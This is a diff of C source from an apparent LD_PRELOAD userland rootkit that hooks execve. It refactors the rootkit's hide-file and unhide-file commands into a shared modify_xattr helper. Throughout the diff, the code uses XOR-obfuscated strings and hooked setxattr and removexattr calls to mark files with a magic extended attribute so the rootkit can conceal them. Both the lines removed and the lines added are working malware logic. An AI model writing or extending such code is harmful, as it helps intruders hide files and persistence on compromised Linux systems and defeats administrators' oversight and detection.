@@ -59,27 +59,10 @@ int execve(const char *filename, char *const argv[], char *const envp[])
                         CLEAN(unhide_usage); exit(0);
                     }
 
-                    char *target_file = argv[2];
-                    char *install = strdup(INSTALL); xor(install);
-                    char *ld_preload_etc = strdup(LD_PRELOAD_ETC); xor(ld_preload_etc);
-                    if((strstr(target_file, install) || strstr(target_file, ld_preload_etc)) && hidden_xattr(target_file)) { CLEAN(ld_preload_etc); CLEAN(install); exit(0); } // ok just exit.. no threats to your life
-                    CLEAN(ld_preload_etc); CLEAN(install);
-
-                    char *xattr = strdup(XATTR), xattr_user[256];
-                    char *hidden_xattr_1_str = strdup(HIDDEN_XATTR_1_STR);
-
-                    xor(hidden_xattr_1_str); xor(xattr);
-                    snprintf(xattr_user, sizeof(xattr_user), xattr, hidden_xattr_1_str); // create user.blahblahblah attribute to hide the file
-                    CLEAN(xattr); CLEAN(hidden_xattr_1_str);
-
-                    HOOK(old_removexattr, CREMOVEXATTR);
-                    int ret = old_removexattr(target_file, xattr_user);
-
-                    if(ret < 0 && errno == ENOENT) { printf("File %s does not exist.\n", target_file); exit(0); } // invalid path
-                    if(ret < 0 && errno == ENODATA) { printf("File %s isn't hidden.\n", target_file); exit(0); } // visible file
+                    if(modify_xattr(argv[2], 2) < 0) { printf("File %s does not exist or is already unhidden.\n", argv[2]); exit(0); }
 
                     char *unhide_success = strdup(UNHIDE_SUCCESS); xor(unhide_success);
-                    printf(unhide_success, target_file);
+                    printf(unhide_success, argv[2]);
                     CLEAN(unhide_success); exit(0);
                 }
                 CLEAN(unhide_file);
@@ -95,25 +78,10 @@ int execve(const char *filename, char *const argv[], char *const envp[])
                         CLEAN(hide_usage); exit(0);
                     }
 
-                    char *target_file = argv[2], xattr_user[256];
-                    char *hidden_xattr_1_str = strdup(HIDDEN_XATTR_1_STR);
-                    char *hidden_xattr_2_str = strdup(HIDDEN_XATTR_2_STR);
-                    char *xattr = strdup(XATTR);
-
-                    xor(hidden_xattr_1_str); xor(xattr);
-                    snprintf(xattr_user, sizeof(xattr_user), xattr, hidden_xattr_1_str);
-                    CLEAN(xattr); CLEAN(hidden_xattr_1_str);
-
-                    xor(hidden_xattr_2_str);
-                    HOOK(old_setxattr, CSETXATTR);
-                    int ret = old_setxattr(target_file, xattr_user, hidden_xattr_2_str, strlen(hidden_xattr_2_str), XATTR_CREATE);
-                    CLEAN(hidden_xattr_2_str);
-
-                    if(ret < 0 && errno == ENOENT) { printf("File %s does not exist.\n", target_file); exit(0); } // invalid path
-                    if(ret < 0 && errno == EEXIST) { printf("File %s is already hidden.\n", target_file); exit(0); } // file already hidden
+                    if(modify_xattr(argv[2], 1) < 0) { printf("File %s does not exist or is already hidden.\n", argv[2]); exit(0); } // file already hidden
 
                     char *hide_success = strdup(HIDE_SUCCESS); xor(hide_success);
-                    printf(hide_success, target_file);
+                    printf(hide_success, argv[2]);
                     CLEAN(hide_success); exit(0);
                 }
                 CLEAN(hide_file);
@@ -158,7 +126,7 @@ int execve(const char *filename, char *const argv[], char *const envp[])
     char *ld_so_path = strdup(LD_SO_PATH); xor(ld_so_path);
 
     char *ld_preload = strdup(LD_PRELOAD); xor(ld_preload);
-    
+
     if(!fnmatch(ld_linux_so_path, filename, FNM_PATHNAME) || !fnmatch(ld_so_path, filename, FNM_PATHNAME))
     {
         for(i = 0; argv[i] != NULL; i++)
